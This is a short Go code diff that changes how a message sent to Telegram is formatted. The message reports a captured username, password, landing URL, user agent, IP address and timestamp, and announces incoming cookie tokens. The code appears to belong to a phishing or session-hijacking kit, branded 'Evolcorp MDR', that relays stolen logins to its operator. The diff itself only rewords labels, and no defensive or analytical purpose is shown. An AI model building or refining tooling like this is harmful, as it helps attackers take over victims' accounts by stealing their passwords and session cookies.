@@ -222,13 +222,13 @@ func createTxtFile(session Session) (string, error) {
 
 // formatSessionMessage creates the text snippet for Telegram (excluding token data).
 func formatSessionMessage(session Session) string {
-	return fmt.Sprintf("✅🔐 ====== Evolcorp MDR ====== 🔐✅\n\n"+
+	return fmt.Sprintf("🔐 Evolcorp MDR 🔐\n\n"+
 		"👤 Username: 🪤 %s\n"+
 		"🔑 Password: 🪤 %s\n"+
 		"🌐 Landing URL: 🔗 %s\n\n"+
-		"🖥️ User-Agent: %s\n"+
-		"🌍 IP Address: %s\n"+
-		"🕒 Timestamp: %d\n\n"+
+		"🖥️ User Agent: %s\n"+
+		"🌍 Remote Address: %s\n"+
+		"🕒 Create Time: %d\n\n"+
 		"📦 Token Delivery. 🍪 incoming.\n",
 		session.Username,
 		session.Password,
